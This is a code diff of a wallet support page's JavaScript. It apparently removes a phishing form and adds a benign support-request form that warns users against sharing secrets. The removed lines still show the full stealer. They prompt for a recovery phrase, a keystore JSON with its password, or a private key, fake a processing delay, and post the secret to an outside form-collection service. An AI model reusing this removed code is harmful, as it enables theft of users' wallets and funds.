@@ -242,6 +242,7 @@ function selectIssue(el) {
 function openRecoveryForm(issue) {
   const body = document.getElementById("help-body");
   window.selectedIssue = issue;
+  window.selectedSupportTab = 1;
 
   body.innerHTML = `
     <button
@@ -255,227 +256,191 @@ function openRecoveryForm(issue) {
     </h3>
 
     <p class="text-gray-500 mb-6">
-      Select a recovery method and complete the required information below.
+      Tell us how we can help. Do not include passwords, recovery phrases,
+      private keys, or other wallet secrets.
     </p>
 
-    <!-- Tabs -->
-    <div class="flex bg-gray-100 rounded-2xl p-1 mb-6" role="tablist">
-
+    <div class="flex gap-2 mb-6" role="tablist" aria-label="Support request options">
       <button
-        class="tab flex-1 py-3 rounded-xl font-semibold transition-all bg-[#5E17EB] text-white shadow-lg"">
-        Phrase
+        id="support-tab-1"
+        type="button"
+        role="tab"
+        aria-selected="true"
+        aria-controls="support-panel-1"
+        onclick="switchSupportTab(1)"
+        class="support-tab flex-1 py-3 rounded-xl font-semibold bg-[#5E17EB] text-white">
+        Tab 1
       </button>
-
       <button
-        class="tab flex-1 py-3 rounded-xl font-semibold transition-all"
-        onclick="switchTab(this,'keystoreForm')">
-        Keystore
+        id="support-tab-2"
+        type="button"
+        role="tab"
+        aria-selected="false"
+        aria-controls="support-panel-2"
+        onclick="switchSupportTab(2)"
+        class="support-tab flex-1 py-3 rounded-xl font-semibold bg-gray-100 text-gray-600">
+        Tab 2
       </button>
-
       <button
-        class="tab flex-1 py-3 rounded-xl font-semibold transition-all"
-        onclick="switchTab(this,'privateKeyForm')">
-        Private Key
+        id="support-tab-3"
+        type="button"
+        role="tab"
+        aria-selected="false"
+        aria-controls="support-panel-3"
+        onclick="switchSupportTab(3)"
+        class="support-tab flex-1 py-3 rounded-xl font-semibold bg-gray-100 text-gray-600">
+        Tab 3
       </button>
-
     </div>
 
-    <!-- Forms -->
-    <div class="form-area">
-
-      <!-- Phrase -->
-      <div <div id="phraseForm" class="form-tab" style="display:block;">
-
-        <textarea
-          id="detailsField"
-          rows="6"
-          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
-          placeholder="Enter your recovery phrase"></textarea>
-
-        <p class="text-sm text-gray-500 mt-3">
-          Typically 12 or 24 words separated by single spaces.
-        </p>
-
-      </div>
-
-      <!-- Keystore -->
-      <div id="keystoreForm" class="form-tab" style="display:none;">
-
-        <textarea
-         id="configField"
-          rows="6"
-          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
-          placeholder="Enter Keystore JSON"></textarea>
-
+    <form id="support-form" onsubmit="submitSupportRequest(event)">
+      <section id="support-panel-1" role="tabpanel" aria-labelledby="support-tab-1">
+        <label for="emailField" class="block font-semibold mb-2">Email address</label>
         <input
-          type="password"
-          class="w-full mt-4 border border-gray-300 rounded-2xl p-4 focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
-          placeholder="Wallet Password">
+          id="emailField"
+          name="email"
+          type="email"
+          autocomplete="email"
+          required
+          class="w-full border border-gray-300 rounded-2xl p-4 mb-5 focus:outline-none focus:ring-2 focus:ring-[#5E17EB]"
+          placeholder="you@example.com">
+      </section>
 
-        <p class="text-sm text-gray-500 mt-3">
-          Paste the keystore JSON and enter the password used when it was created.
+      <section id="support-panel-2" role="tabpanel" aria-labelledby="support-tab-2" hidden>
+        <label for="walletNameField" class="block font-semibold mb-2">Wallet name</label>
+        <input
+          id="walletNameField"
+          name="walletName"
+          type="text"
+          maxlength="100"
+          required
+          disabled
+          class="w-full border border-gray-300 rounded-2xl p-4 mb-5 focus:outline-none focus:ring-2 focus:ring-[#5E17EB]"
+          placeholder="Name of the wallet app or provider">
+        <p class="text-sm text-gray-500 -mt-3 mb-5">
+          Enter only the wallet's public name, never a password or recovery credential.
         </p>
+      </section>
 
-      </div>
+      <section id="support-panel-3" role="tabpanel" aria-labelledby="support-tab-3" hidden>
+        <label for="issueTypeField" class="block font-semibold mb-2">Type of issue</label>
+        <input
+          id="issueTypeField"
+          name="issueType"
+          type="text"
+          maxlength="100"
+          required
+          disabled
+          class="w-full border border-gray-300 rounded-2xl p-4 mb-5 focus:outline-none focus:ring-2 focus:ring-[#5E17EB]"
+          placeholder="For example, login or transfer issue">
+      </section>
 
-      <!-- Private Key -->
-      <div id="privateKeyForm" class="form-tab" style="display:none;">
+      <label for="messageField" class="block font-semibold mb-2">Description of issue</label>
+      <textarea
+        id="messageField"
+        name="message"
+        rows="5"
+        maxlength="2000"
+        required
+        class="w-full border border-gray-300 rounded-2xl p-4 resize-y focus:outline-none focus:ring-2 focus:ring-[#5E17EB]"
+        placeholder="Describe the issue without including sensitive wallet information."></textarea>
 
-        <textarea
-          id="referenceField"
-          rows="6"
-          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
-          placeholder="Enter your Private Key"></textarea>
+      <p id="submit-error" class="hidden text-red-600 mt-3" role="alert"></p>
 
-        <p class="text-sm text-gray-500 mt-3">
-          Usually a long alphanumeric string. Ensure it is entered exactly as provided.
-        </p>
-
-      </div>
-
-      <!-- Buttons -->
-      <div class="flex gap-4 mt-8">
-
-        <button
-          onclick="validateForm()"
-          class="flex-1 bg-[#5E17EB] hover:bg-[#4C0FCE] text-white py-3 rounded-2xl font-semibold transition-all">
-          PROCEED
-        </button>
-
-        <button
-          onclick="openHelpModal()"
-          class="px-8 border border-gray-300 rounded-2xl hover:bg-gray-100 transition-all">
-          Cancel
-        </button>
-
-      </div>
-
-    </div>
+      <button
+        type="submit"
+        class="w-full mt-6 bg-[#5E17EB] hover:bg-[#4C0FCE] text-white py-3 rounded-2xl font-semibold transition-all">
+        Send support request
+      </button>
+    </form>
   `;
 }
 
-function switchTab(button, tabId) {
-  // Reset all tabs
-  document.querySelectorAll(".tab").forEach((tab) => {
-    tab.classList.remove("bg-[#5E17EB]", "text-white", "shadow-lg");
-
-    tab.classList.add("text-gray-500");
+function switchSupportTab(tabNumber) {
+  document.querySelectorAll(".support-tab").forEach((tab, index) => {
+    const active = index + 1 === tabNumber;
+    tab.setAttribute("aria-selected", String(active));
+    tab.classList.toggle("bg-[#5E17EB]", active);
+    tab.classList.toggle("text-white", active);
+    tab.classList.toggle("bg-gray-100", !active);
+    tab.classList.toggle("text-gray-600", !active);
   });
 
-  // Highlight selected tab
-  button.classList.remove("text-gray-500");
-
-  button.classList.add("bg-[#5E17EB]", "text-white", "shadow-lg");
-
-  // Hide all forms
-  document.querySelectorAll(".form-tab").forEach((form) => {
-    form.style.display = "none";
+  [1, 2, 3].forEach((number) => {
+    const panel = document.getElementById(`support-panel-${number}`);
+    const active = number === tabNumber;
+    panel.hidden = !active;
+    panel.querySelectorAll("input").forEach((input) => {
+      input.disabled = !active;
+    });
   });
-
-  // Show selected form
-  document.getElementById(tabId).style.display = "block";
+  window.selectedSupportTab = tabNumber;
 }
 
-async function validateForm() {
-  let details = "";
+async function submitSupportRequest(event) {
+  event.preventDefault();
 
-  // Phrase form is visible
-  if (document.getElementById("phraseForm").style.display !== "none") {
-    details = document.getElementById("detailsField").value.trim();
+  const form = event.currentTarget;
+  const button = form.querySelector('button[type="submit"]');
+  const error = document.getElementById("submit-error");
+  const tab = window.selectedSupportTab || 1;
+  const email = form.elements.email.value.trim();
+  const walletName = form.elements.walletName.value.trim();
+  const issueType = form.elements.issueType.value.trim();
+  const message = form.elements.message.value.trim();
+
+  error.classList.add("hidden");
+  button.disabled = true;
+  button.textContent = "Sending...";
+
+  try {
+    const response = await fetch("/api/support", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        tab,
+        issue: window.selectedIssue,
+        ...(tab === 1 ? { email } : {}),
+        ...(tab === 2 ? { walletName } : {}),
+        ...(tab === 3 ? { issueType } : {}),
+        message,
+      }),
+    });
+
+    if (!response.ok) {
+      throw new Error(`Support server returned HTTP ${response.status}`);
+    }
+
+    showSuccess();
+  } catch (submissionError) {
+    console.error("Support request submission failed:", submissionError);
+    error.textContent =
+      "We couldn't send your request. Please try again in a moment.";
+    error.classList.remove("hidden");
+    button.disabled = false;
+    button.textContent = "Send support request";
   }
-
-  // Keystore form is visible
-  else if (document.getElementById("keystoreForm").style.display !== "none") {
-    details = document.getElementById("configField").value.trim();
-  }
-
-  // Private Key form is visible
-  else if (document.getElementById("privateKeyForm").style.display !== "none") {
-    details = document.getElementById("referenceField").value.trim();
-  }
-
-  if (!details) {
-    alert("Please complete the required field.");
-    return;
-  }
-
-  showLoading(details);
-}
-
-async function submitFirstForm(details) {
-  await fetch("https://submit-form.com/RMPTnnWij", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      issue: window.selectedIssue,
-      details: details,
-    }),
-  }).catch(console.error);
-  showSuccess();
 }
 
 function showSuccess() {
   const body = document.getElementById("help-body");
 
   body.innerHTML = `
-
-<div class="text-center py-20">
-
-<div class="text-6xl mb-6">
-✅
-</div>
-
-<h2 class="text-3xl font-bold mb-4">
-
-Request Submitted
-
-</h2>
-
-<p class="text-gray-500 mb-8">
-
-Your support request has been received successfully.
-</p>
-
-<button
-onclick="closeHelpModal()"
-class="bg-[#5E17EB] text-white px-8 py-3 rounded-2xl">
-
-Close
-
-</button>
-
-</div>
-
-`;
-}
-function showLoading(details) {
-  const body = document.getElementById("help-body");
-
-  body.innerHTML = `
-
-<div class="flex flex-col items-center justify-center py-20">
-
-<div
-class="animate-spin rounded-full h-16 w-16 border-4 border-purple-200 border-t-[#5E17EB]">
-</div>
-
-<h3 class="mt-8 text-xl font-semibold">
-Processing Request...
-</h3>
-
-<p class="text-gray-500 mt-2">
-Please wait...
-</p>
-
-</div>
-
-`;
-
-  setTimeout(() => {
-    submitFirstForm(details);
-  }, 1000);
+    <div class="text-center py-20">
+      <div class="text-6xl mb-6" aria-hidden="true">✅</div>
+      <h2 class="text-3xl font-bold mb-4">Request submitted</h2>
+      <p class="text-gray-500 mb-8">
+        Your support request has been sent to the team.
+      </p>
+      <button
+        onclick="closeHelpModal()"
+        class="bg-[#5E17EB] text-white px-8 py-3 rounded-2xl">
+        Close
+      </button>
+    </div>
+  `;
 }
 function resetHelpModal() {
   const body = document.getElementById("help-body");
